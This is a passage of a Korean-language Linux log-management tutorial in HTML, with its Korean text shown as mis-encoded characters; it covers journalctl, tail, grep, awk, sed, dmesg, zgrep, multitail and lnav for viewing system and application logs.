&lt;h3 id=&quot;ì‹œê°„-ê¸°ë°˜-í•„í„°ë§&quot;&gt;&lt;a href=&quot;#ì‹œê°„-ê¸°ë°˜-í•„í„°ë§&quot; class=&quot;headerlink&quot; title=&quot;ì‹œê°„ ê¸°ë°˜ í•„í„°ë§&quot;&gt;&lt;/a&gt;ì‹œê°„ ê¸°ë°˜ í•„í„°ë§&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# íŠ¹ì • ë‚ ì§œ ë²”ìœ„&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl --since &lt;span class=&quot;string&quot;&gt;&amp;quot;2024-01-01&amp;quot;&lt;/span&gt; --&lt;span class=&quot;keyword&quot;&gt;until&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;2024-01-02&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ìƒëŒ€ì  ì‹œê°„&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl --since &lt;span class=&quot;string&quot;&gt;&amp;quot;1 hour ago&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl --since &lt;span class=&quot;string&quot;&gt;&amp;quot;30 minutes ago&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl --since &lt;span class=&quot;string&quot;&gt;&amp;quot;yesterday&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl --since &lt;span class=&quot;string&quot;&gt;&amp;quot;today&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# íŠ¹ì • ì‹œê°ë¶€í„°&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl --since &lt;span class=&quot;string&quot;&gt;&amp;quot;2024-01-01 14:30:00&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ë¶€íŒ… ë¡œê·¸ í™•ì¸&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl -b        &lt;span class=&quot;comment&quot;&gt;# í˜„ì¬ ë¶€íŒ…&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl -b -1     &lt;span class=&quot;comment&quot;&gt;# ì´ì „ ë¶€íŒ…&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl --list-boots  &lt;span class=&quot;comment&quot;&gt;# ë¶€íŒ… ëª©ë¡&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="Linux-ë¡œê·¸-ì‹œìŠ¤í…œ-ê°œìš”"><a href="#Linux-ë¡œê·¸-ì‹œìŠ¤í…œ-ê°œìš”" class="headerlink" title="Linux ë¡œê·¸ ì‹œìŠ¤í…œ ê°œìš”"></a>Linux ë¡œê·¸ ì‹œìŠ¤í…œ ê°œìš”</h2><p>Linux ì‹œìŠ¤í…œì—ì„œ ë¡œê·¸ëŠ” ì‹œìŠ¤í…œ ìƒíƒœ, ì• í”Œë¦¬ì¼€ì´ì…˜ ë™ì‘, ë³´ì•ˆ ì´ë²¤íŠ¸ ë“±ì„ ì¶”ì í•˜ëŠ” ì¤‘ìš”í•œ ë„êµ¬ì…ë‹ˆë‹¤. ë¡œê·¸ë¥¼ íš¨ê³¼ì ìœ¼ë¡œ ê´€ë¦¬í•˜ê³  ë¶„ì„í•˜ëŠ” ê²ƒì€ ì‹œìŠ¤í…œ ê´€ë¦¬ìì™€ ê°œë°œìì—ê²Œ í•„ìˆ˜ì ì¸ ì—­ëŸ‰ì…ë‹ˆë‹¤.</p><h2 id="1-systemd-ê¸°ë°˜-ë¡œê·¸-ê´€ë¦¬-journalctl"><a href="#1-systemd-ê¸°ë°˜-ë¡œê·¸-ê´€ë¦¬-journalctl" class="headerlink" title="1. systemd ê¸°ë°˜ ë¡œê·¸ ê´€ë¦¬ (journalctl)"></a>1. systemd ê¸°ë°˜ ë¡œê·¸ ê´€ë¦¬ (journalctl)</h2><p>í˜„ëŒ€ Linux ë°°í¬íŒì˜ ëŒ€ë¶€ë¶„ì€ systemdë¥¼ ì‚¬ìš©í•˜ë©°, journalctlì€ systemdì˜ ë¡œê·¸ ì¡°íšŒ ë„êµ¬ì…ë‹ˆë‹¤.</p><h3 id="ê¸°ë³¸-ì¡°íšŒ"><a href="#ê¸°ë³¸-ì¡°íšŒ" class="headerlink" title="ê¸°ë³¸ ì¡°íšŒ"></a>ê¸°ë³¸ ì¡°íšŒ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì „ì²´ ì‹œìŠ¤í…œ ë¡œê·¸ í™•ì¸</span></span><br><span class="line">journalctl</span><br><span class="line"></span><br><span class="line"><span class="comment"># ìµœê·¼ ë¡œê·¸ë§Œ í™•ì¸ (ê¸°ë³¸ 10ì¤„)</span></span><br><span class="line">journalctl -n</span><br><span class="line"></span><br><span class="line"><span class="comment"># ìµœê·¼ 100ì¤„ í™•ì¸</span></span><br><span class="line">journalctl -n 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì‹¤ì‹œê°„ìœ¼ë¡œ ë¡œê·¸ í™•ì¸ (tail -f ì²˜ëŸ¼)</span></span><br><span class="line">journalctl -f</span><br><span class="line"></span><br><span class="line"><span class="comment"># í˜ì´ì§€ ë‹¨ìœ„ë¡œ í™•ì¸ (ê¸°ë³¸)</span></span><br><span class="line">journalctl --no-pager</span><br></pre></td></tr></table></figure><h3 id="ì„œë¹„ìŠ¤ë³„-ë¡œê·¸-í™•ì¸"><a href="#ì„œë¹„ìŠ¤ë³„-ë¡œê·¸-í™•ì¸" class="headerlink" title="ì„œë¹„ìŠ¤ë³„ ë¡œê·¸ í™•ì¸"></a>ì„œë¹„ìŠ¤ë³„ ë¡œê·¸ í™•ì¸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># íŠ¹ì • ì„œë¹„ìŠ¤ ë¡œê·¸ í™•ì¸</span></span><br><span class="line">journalctl -u nginx.service</span><br><span class="line">journalctl -u apache2.service</span><br><span class="line">journalctl -u mysql.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì—¬ëŸ¬ ì„œë¹„ìŠ¤ ë™ì‹œ í™•ì¸</span></span><br><span class="line">journalctl -u nginx.service -u mysql.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì„œë¹„ìŠ¤ ë¡œê·¸ ì‹¤ì‹œê°„ ëª¨ë‹ˆí„°ë§</span></span><br><span class="line">journalctl -u nginx.service -f</span><br></pre></td></tr></table></figure><h3 id="ì‹œê°„-ê¸°ë°˜-í•„í„°ë§"><a href="#ì‹œê°„-ê¸°ë°˜-í•„í„°ë§" class="headerlink" title="ì‹œê°„ ê¸°ë°˜ í•„í„°ë§"></a>ì‹œê°„ ê¸°ë°˜ í•„í„°ë§</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># íŠ¹ì • ë‚ ì§œ ë²”ìœ„</span></span><br><span class="line">journalctl --since <span class="string">&quot;2024-01-01&quot;</span> --<span class="keyword">until</span> <span class="string">&quot;2024-01-02&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ìƒëŒ€ì  ì‹œê°„</span></span><br><span class="line">journalctl --since <span class="string">&quot;1 hour ago&quot;</span></span><br><span class="line">journalctl --since <span class="string">&quot;30 minutes ago&quot;</span></span><br><span class="line">journalctl --since <span class="string">&quot;yesterday&quot;</span></span><br><span class="line">journalctl --since <span class="string">&quot;today&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># íŠ¹ì • ì‹œê°ë¶€í„°</span></span><br><span class="line">journalctl --since <span class="string">&quot;2024-01-01 14:30:00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ë¶€íŒ… ë¡œê·¸ í™•ì¸</span></span><br><span class="line">journalctl -b        <span class="comment"># í˜„ì¬ ë¶€íŒ…</span></span><br><span class="line">journalctl -b -1     <span class="comment"># ì´ì „ ë¶€íŒ…</span></span><br><span class="line">journalctl --list-boots  <span class="comment"># ë¶€íŒ… ëª©ë¡</span></span><br></pre></td></tr></table></figure><h3 id="ìš°ì„ ìˆœìœ„ë³„-í•„í„°ë§"><a href="#ìš°ì„ ìˆœìœ„ë³„-í•„í„°ë§" class="headerlink" title="ìš°ì„ ìˆœìœ„ë³„ í•„í„°ë§"></a>ìš°ì„ ìˆœìœ„ë³„ í•„í„°ë§</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì—ëŸ¬ ë ˆë²¨ ì´ìƒë§Œ í‘œì‹œ</span></span><br><span class="line">journalctl -p err</span><br><span class="line"></span><br><span class="line"><span class="comment"># ê²½ê³  ë ˆë²¨ ì´ìƒ</span></span><br><span class="line">journalctl -p warning</span><br><span class="line"></span><br><span class="line"><span class="comment"># ìš°ì„ ìˆœìœ„ ë ˆë²¨: emerg(0), alert(1), crit(2), err(3), warning(4), notice(5), info(6), debug(7)</span></span><br></pre></td></tr></table></figure><h3 id="ì¶œë ¥-í˜•ì‹-ì§€ì •"><a href="#ì¶œë ¥-í˜•ì‹-ì§€ì •" class="headerlink" title="ì¶œë ¥ í˜•ì‹ ì§€ì •"></a>ì¶œë ¥ í˜•ì‹ ì§€ì •</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># JSON í˜•ì‹ìœ¼ë¡œ ì¶œë ¥</span></span><br><span class="line">journalctl -o json</span><br><span class="line"></span><br><span class="line"><span class="comment"># ìƒì„¸í•œ JSON í˜•ì‹</span></span><br><span class="line">journalctl -o json-pretty</span><br><span class="line"></span><br><span class="line"><span class="comment"># ê°„ê²°í•œ í˜•ì‹</span></span><br><span class="line">journalctl -o short</span><br><span class="line"></span><br><span class="line"><span class="comment"># ìì„¸í•œ í˜•ì‹</span></span><br><span class="line">journalctl -o verbose</span><br></pre></td></tr></table></figure><h2 id="2-ì „í†µì ì¸-ë¡œê·¸-íŒŒì¼-ê´€ë¦¬"><a href="#2-ì „í†µì ì¸-ë¡œê·¸-íŒŒì¼-ê´€ë¦¬" class="headerlink" title="2. ì „í†µì ì¸ ë¡œê·¸ íŒŒì¼ ê´€ë¦¬"></a>2. ì „í†µì ì¸ ë¡œê·¸ íŒŒì¼ ê´€ë¦¬</h2><h3 id="ì£¼ìš”-ë¡œê·¸-íŒŒì¼-ìœ„ì¹˜"><a href="#ì£¼ìš”-ë¡œê·¸-íŒŒì¼-ìœ„ì¹˜" class="headerlink" title="ì£¼ìš” ë¡œê·¸ íŒŒì¼ ìœ„ì¹˜"></a>ì£¼ìš” ë¡œê·¸ íŒŒì¼ ìœ„ì¹˜</h3><h4 id="Debian-Ubuntu-ê³„ì—´"><a href="#Debian-Ubuntu-ê³„ì—´" class="headerlink" title="Debian&#x2F;Ubuntu ê³„ì—´"></a>Debian&#x2F;Ubuntu ê³„ì—´</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/log/syslog              <span class="comment"># ì „ì²´ ì‹œìŠ¤í…œ ë¡œê·¸</span></span><br><span class="line">/var/log/auth.log            <span class="comment"># ì¸ì¦ ê´€ë ¨ ë¡œê·¸</span></span><br><span class="line">/var/log/kern.log            <span class="comment"># ì»¤ë„ ë¡œê·¸</span></span><br><span class="line">/var/log/boot.log            <span class="comment"># ë¶€íŒ… ë¡œê·¸</span></span><br><span class="line">/var/log/dmesg               <span class="comment"># ì»¤ë„ ë§ ë²„í¼ ë©”ì‹œì§€</span></span><br><span class="line">/var/log/cron.log            <span class="comment"># Cron ì‘ì—… ë¡œê·¸</span></span><br></pre></td></tr></table></figure><h4 id="RHEL-CentOS-ê³„ì—´"><a href="#RHEL-CentOS-ê³„ì—´" class="headerlink" title="RHEL&#x2F;CentOS ê³„ì—´"></a>RHEL&#x2F;CentOS ê³„ì—´</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/log/messages            <span class="comment"># ì „ì²´ ì‹œìŠ¤í…œ ë¡œê·¸</span></span><br><span class="line">/var/log/secure              <span class="comment"># ì¸ì¦ ê´€ë ¨ ë¡œê·¸</span></span><br><span class="line">/var/log/maillog             <span class="comment"># ë©”ì¼ ì„œë²„ ë¡œê·¸</span></span><br><span class="line">/var/log/cron                <span class="comment"># Cron ì‘ì—… ë¡œê·¸</span></span><br></pre></td></tr></table></figure><h4 id="ì• í”Œë¦¬ì¼€ì´ì…˜-ë¡œê·¸"><a href="#ì• í”Œë¦¬ì¼€ì´ì…˜-ë¡œê·¸" class="headerlink" title="ì• í”Œë¦¬ì¼€ì´ì…˜ ë¡œê·¸"></a>ì• í”Œë¦¬ì¼€ì´ì…˜ ë¡œê·¸</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/log/apache2/            <span class="comment"># Apache ì›¹ì„œë²„ (Debian/Ubuntu)</span></span><br><span class="line">/var/log/httpd/              <span class="comment"># Apache ì›¹ì„œë²„ (RHEL/CentOS)</span></span><br><span class="line">/var/log/nginx/              <span class="comment"># Nginx ì›¹ì„œë²„</span></span><br><span class="line">/var/log/mysql/              <span class="comment"># MySQL ë°ì´í„°ë² ì´ìŠ¤</span></span><br><span class="line">/var/log/postgresql/         <span class="comment"># PostgreSQL ë°ì´í„°ë² ì´ìŠ¤</span></span><br></pre></td></tr></table></figure><h3 id="tail-ëª…ë ¹ì–´"><a href="#tail-ëª…ë ¹ì–´" class="headerlink" title="tail ëª…ë ¹ì–´"></a>tail ëª…ë ¹ì–´</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ë§ˆì§€ë§‰ 10ì¤„ í™•ì¸ (ê¸°ë³¸)</span></span><br><span class="line"><span class="built_in">tail</span> /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë§ˆì§€ë§‰ Nì¤„ í™•ì¸</span></span><br><span class="line"><span class="built_in">tail</span> -n 50 /var/log/syslog</span><br><span class="line"><span class="built_in">tail</span> -n 100 /var/log/auth.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì‹¤ì‹œê°„ ë¡œê·¸ ëª¨ë‹ˆí„°ë§ (ê°€ì¥ ë§ì´ ì‚¬ìš©)</span></span><br><span class="line"><span class="built_in">tail</span> -f /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì—¬ëŸ¬ íŒŒì¼ ë™ì‹œ ëª¨ë‹ˆí„°ë§</span></span><br><span class="line"><span class="built_in">tail</span> -f /var/log/syslog /var/log/auth.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># íŒŒì¼ ì²˜ìŒë¶€í„° ëª¨ë‹ˆí„°ë§</span></span><br><span class="line"><span class="built_in">tail</span> -f -n +1 /var/log/syslog</span><br></pre></td></tr></table></figure><h3 id="head-ëª…ë ¹ì–´"><a href="#head-ëª…ë ¹ì–´" class="headerlink" title="head ëª…ë ¹ì–´"></a>head ëª…ë ¹ì–´</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì²˜ìŒ 10ì¤„ í™•ì¸</span></span><br><span class="line"><span class="built_in">head</span> /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì²˜ìŒ Nì¤„ í™•ì¸</span></span><br><span class="line"><span class="built_in">head</span> -n 50 /var/log/syslog</span><br></pre></td></tr></table></figure><h3 id="cat-ëª…ë ¹ì–´"><a href="#cat-ëª…ë ¹ì–´" class="headerlink" title="cat ëª…ë ¹ì–´"></a>cat ëª…ë ¹ì–´</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì „ì²´ ë¡œê·¸ ì¶œë ¥</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># í˜ì´ì§€ ë‹¨ìœ„ë¡œ í™•ì¸</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/syslog | less</span><br><span class="line"><span class="built_in">cat</span> /var/log/syslog | more</span><br></pre></td></tr></table></figure><h3 id="less-more-ëª…ë ¹ì–´"><a href="#less-more-ëª…ë ¹ì–´" class="headerlink" title="less&#x2F;more ëª…ë ¹ì–´"></a>less&#x2F;more ëª…ë ¹ì–´</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ìŠ¤í¬ë¡¤ ê°€ëŠ¥í•œ ë·°ì–´ë¡œ í™•ì¸</span></span><br><span class="line">less /var/log/syslog</span><br><span class="line">more /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># lessì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•œ í‚¤</span></span><br><span class="line"><span class="comment"># Space: ë‹¤ìŒ í˜ì´ì§€</span></span><br><span class="line"><span class="comment"># b: ì´ì „ í˜ì´ì§€</span></span><br><span class="line"><span class="comment"># /: ê²€ìƒ‰</span></span><br><span class="line"><span class="comment"># n: ë‹¤ìŒ ê²€ìƒ‰ ê²°ê³¼</span></span><br><span class="line"><span class="comment"># N: ì´ì „ ê²€ìƒ‰ ê²°ê³¼</span></span><br><span class="line"><span class="comment"># G: íŒŒì¼ ëìœ¼ë¡œ</span></span><br><span class="line"><span class="comment"># g: íŒŒì¼ ì²˜ìŒìœ¼ë¡œ</span></span><br><span class="line"><span class="comment"># q: ì¢…ë£Œ</span></span><br></pre></td></tr></table></figure><h2 id="3-ë¡œê·¸-ê²€ìƒ‰-ë°-í•„í„°ë§"><a href="#3-ë¡œê·¸-ê²€ìƒ‰-ë°-í•„í„°ë§" class="headerlink" title="3. ë¡œê·¸ ê²€ìƒ‰ ë° í•„í„°ë§"></a>3. ë¡œê·¸ ê²€ìƒ‰ ë° í•„í„°ë§</h2><h3 id="grepì„-ì´ìš©í•œ-ê²€ìƒ‰"><a href="#grepì„-ì´ìš©í•œ-ê²€ìƒ‰" class="headerlink" title="grepì„ ì´ìš©í•œ ê²€ìƒ‰"></a>grepì„ ì´ìš©í•œ ê²€ìƒ‰</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># íŠ¹ì • í‚¤ì›Œë“œ ê²€ìƒ‰</span></span><br><span class="line">grep <span class="string">&quot;error&quot;</span> /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># ëŒ€ì†Œë¬¸ì ë¬´ì‹œí•˜ê³  ê²€ìƒ‰</span></span><br><span class="line">grep -i <span class="string">&quot;error&quot;</span> /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì—¬ëŸ¬ íŒŒì¼ì—ì„œ ê²€ìƒ‰</span></span><br><span class="line">grep <span class="string">&quot;error&quot;</span> /var/log/*.<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì¬ê·€ì ìœ¼ë¡œ ë””ë ‰í† ë¦¬ ì „ì²´ ê²€ìƒ‰</span></span><br><span class="line">grep -r <span class="string">&quot;error&quot;</span> /var/log/</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì¤„ ë²ˆí˜¸ì™€ í•¨ê»˜ í‘œì‹œ</span></span><br><span class="line">grep -n <span class="string">&quot;error&quot;</span> /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë§¤ì¹­ëœ ì¤„ì˜ ì´ì „/ì´í›„ ì»¨í…ìŠ¤íŠ¸ í¬í•¨</span></span><br><span class="line">grep -A 5 <span class="string">&quot;error&quot;</span> /var/log/syslog  <span class="comment"># ì´í›„ 5ì¤„</span></span><br><span class="line">grep -B 5 <span class="string">&quot;error&quot;</span> /var/log/syslog  <span class="comment"># ì´ì „ 5ì¤„</span></span><br><span class="line">grep -C 5 <span class="string">&quot;error&quot;</span> /var/log/syslog  <span class="comment"># ì „í›„ 5ì¤„</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì‹¤ì‹œê°„ ë¡œê·¸ì—ì„œ ê²€ìƒ‰</span></span><br><span class="line"><span class="built_in">tail</span> -f /var/log/syslog | grep <span class="string">&quot;error&quot;</span></span><br><span class="line"><span class="built_in">tail</span> -f /var/log/syslog | grep -i <span class="string">&quot;error\|warning&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì œì™¸ ê²€ìƒ‰</span></span><br><span class="line">grep -v <span class="string">&quot;info&quot;</span> /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì •ê·œí‘œí˜„ì‹ ì‚¬ìš©</span></span><br><span class="line">grep -E <span class="string">&quot;error|warning|critical&quot;</span> /var/log/syslog</span><br></pre></td></tr></table></figure><h3 id="awkë¥¼-ì´ìš©í•œ-ë¡œê·¸-ë¶„ì„"><a href="#awkë¥¼-ì´ìš©í•œ-ë¡œê·¸-ë¶„ì„" class="headerlink" title="awkë¥¼ ì´ìš©í•œ ë¡œê·¸ ë¶„ì„"></a>awkë¥¼ ì´ìš©í•œ ë¡œê·¸ ë¶„ì„</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># íŠ¹ì • ì»¬ëŸ¼ë§Œ ì¶œë ¥</span></span><br><span class="line">awk <span class="string">&#x27;&#123;print $1, $2, $3&#125;&#x27;</span> /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì¡°ê±´ë¶€ ì¶œë ¥</span></span><br><span class="line">awk <span class="string">&#x27;/error/ &#123;print $0&#125;&#x27;</span> /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># íŠ¹ì • í•„ë“œ ê¸°ì¤€ í•„í„°ë§</span></span><br><span class="line">awk <span class="string">&#x27;$5 == &quot;error&quot;&#x27;</span> /var/log/syslog</span><br></pre></td></tr></table></figure><h3 id="sedë¥¼-ì´ìš©í•œ-í…ìŠ¤íŠ¸-ì²˜ë¦¬"><a href="#sedë¥¼-ì´ìš©í•œ-í…ìŠ¤íŠ¸-ì²˜ë¦¬" class="headerlink" title="sedë¥¼ ì´ìš©í•œ í…ìŠ¤íŠ¸ ì²˜ë¦¬"></a>sedë¥¼ ì´ìš©í•œ í…ìŠ¤íŠ¸ ì²˜ë¦¬</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># íŠ¹ì • ë¼ì¸ ë²”ìœ„ë§Œ ì¶œë ¥</span></span><br><span class="line">sed -n <span class="string">&#x27;100,200p&#x27;</span> /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># íŒ¨í„´ ë§¤ì¹­ëœ ë¼ì¸ ì¶œë ¥</span></span><br><span class="line">sed -n <span class="string">&#x27;/error/p&#x27;</span> /var/log/syslog</span><br></pre></td></tr></table></figure><h2 id="4-ì••ì¶•ëœ-ë¡œê·¸-íŒŒì¼-í™•ì¸"><a href="#4-ì••ì¶•ëœ-ë¡œê·¸-íŒŒì¼-í™•ì¸" class="headerlink" title="4. ì••ì¶•ëœ ë¡œê·¸ íŒŒì¼ í™•ì¸"></a>4. ì••ì¶•ëœ ë¡œê·¸ íŒŒì¼ í™•ì¸</h2><p>ì‹œìŠ¤í…œì€ ì˜¤ë˜ëœ ë¡œê·¸ë¥¼ ìë™ìœ¼ë¡œ ì••ì¶•í•˜ì—¬ ì €ì¥í•©ë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .gz ì••ì¶• ë¡œê·¸ í™•ì¸</span></span><br><span class="line">zcat /var/log/syslog.1.gz</span><br><span class="line">zless /var/log/syslog.1.gz</span><br><span class="line">zmore /var/log/syslog.1.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì••ì¶• ë¡œê·¸ì—ì„œ ê²€ìƒ‰</span></span><br><span class="line">zgrep <span class="string">&quot;error&quot;</span> /var/log/syslog.1.gz</span><br><span class="line">zgrep <span class="string">&quot;error&quot;</span> /var/log/syslog.*.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># .bz2 ì••ì¶• ë¡œê·¸ í™•ì¸</span></span><br><span class="line">bzcat /var/log/syslog.1.bz2</span><br><span class="line">bzgrep <span class="string">&quot;error&quot;</span> /var/log/syslog.1.bz2</span><br><span class="line"></span><br><span class="line"><span class="comment"># .xz ì••ì¶• ë¡œê·¸ í™•ì¸</span></span><br><span class="line">xzcat /var/log/syslog.1.xz</span><br><span class="line">xzgrep <span class="string">&quot;error&quot;</span> /var/log/syslog.1.xz</span><br></pre></td></tr></table></figure><h2 id="5-ì»¤ë„-ë¡œê·¸-í™•ì¸"><a href="#5-ì»¤ë„-ë¡œê·¸-í™•ì¸" class="headerlink" title="5. ì»¤ë„ ë¡œê·¸ í™•ì¸"></a>5. ì»¤ë„ ë¡œê·¸ í™•ì¸</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dmesg - ì»¤ë„ ë§ ë²„í¼ ë©”ì‹œì§€</span></span><br><span class="line">dmesg</span><br><span class="line"></span><br><span class="line"><span class="comment"># ìµœê·¼ ë©”ì‹œì§€ë§Œ</span></span><br><span class="line">dmesg | <span class="built_in">tail</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì‹¤ì‹œê°„ ëª¨ë‹ˆí„°ë§</span></span><br><span class="line">dmesg -w</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì‚¬ëŒì´ ì½ê¸° í¸í•œ ì‹œê°„ í˜•ì‹</span></span><br><span class="line">dmesg -T</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë ˆë²¨ë³„ í•„í„°ë§</span></span><br><span class="line">dmesg --level=err</span><br><span class="line">dmesg --level=warn</span><br><span class="line"></span><br><span class="line"><span class="comment"># íŠ¹ì • ì¥ì¹˜ ê´€ë ¨ ë©”ì‹œì§€</span></span><br><span class="line">dmesg | grep -i usb</span><br><span class="line">dmesg | grep -i network</span><br></pre></td></tr></table></figure><h2 id="6-ê³ ê¸‰-ë¡œê·¸-ë¶„ì„-ë„êµ¬"><a href="#6-ê³ ê¸‰-ë¡œê·¸-ë¶„ì„-ë„êµ¬" class="headerlink" title="6. ê³ ê¸‰ ë¡œê·¸ ë¶„ì„ ë„êµ¬"></a>6. ê³ ê¸‰ ë¡œê·¸ ë¶„ì„ ë„êµ¬</h2><h3 id="multitail-ì—¬ëŸ¬-ë¡œê·¸-ë™ì‹œ-ëª¨ë‹ˆí„°ë§"><a href="#multitail-ì—¬ëŸ¬-ë¡œê·¸-ë™ì‹œ-ëª¨ë‹ˆí„°ë§" class="headerlink" title="multitail - ì—¬ëŸ¬ ë¡œê·¸ ë™ì‹œ ëª¨ë‹ˆí„°ë§"></a>multitail - ì—¬ëŸ¬ ë¡œê·¸ ë™ì‹œ ëª¨ë‹ˆí„°ë§</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì„¤ì¹˜</span></span><br><span class="line">sudo apt install multitail     <span class="comment"># Debian/Ubuntu</span></span><br><span class="line">sudo yum install multitail     <span class="comment"># RHEL/CentOS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì—¬ëŸ¬ íŒŒì¼ ë™ì‹œ ëª¨ë‹ˆí„°ë§</span></span><br><span class="line">multitail /var/log/syslog /var/log/auth.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># ìƒ‰ìƒ êµ¬ë¶„</span></span><br><span class="line">multitail -c /var/log/syslog /var/log/auth.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë¶„í•  í™”ë©´</span></span><br><span class="line">multitail -s 2 /var/log/syslog /var/log/auth.log</span><br></pre></td></tr></table></figure><h3 id="lnav-ë¡œê·¸-íŒŒì¼-ë„¤ë¹„ê²Œì´í„°"><a href="#lnav-ë¡œê·¸-íŒŒì¼-ë„¤ë¹„ê²Œì´í„°" class="headerlink" title="lnav - ë¡œê·¸ íŒŒì¼ ë„¤ë¹„ê²Œì´í„°"></a>lnav - ë¡œê·¸ íŒŒì¼ ë„¤ë¹„ê²Œì´í„°</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì„¤ì¹˜</span></span><br><span class="line">sudo apt install lnav          <span class="comment"># Debian/Ubuntu</span></span><br><span class="line">sudo yum install lnav          <span class="comment"># RHEL/CentOS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ì‚¬ìš© (ìë™ìœ¼ë¡œ ë¡œê·¸ íŒŒì¼ ê°ì§€)</span></span><br><span class="line">lnav</span><br><span class="line"></span><br><span class="line"><span class="comment"># íŠ¹ì • íŒŒì¼ ì—´ê¸°</span></span><br><span class="line">lnav /var/log/syslog</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì—¬ëŸ¬ íŒŒì¼ ë™ì‹œì—</span></span><br><span class="line">lnav /var/log/syslog /var/log/auth.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># lnav ì£¼ìš” ê¸°ëŠ¥</span></span><br><span class="line"><span 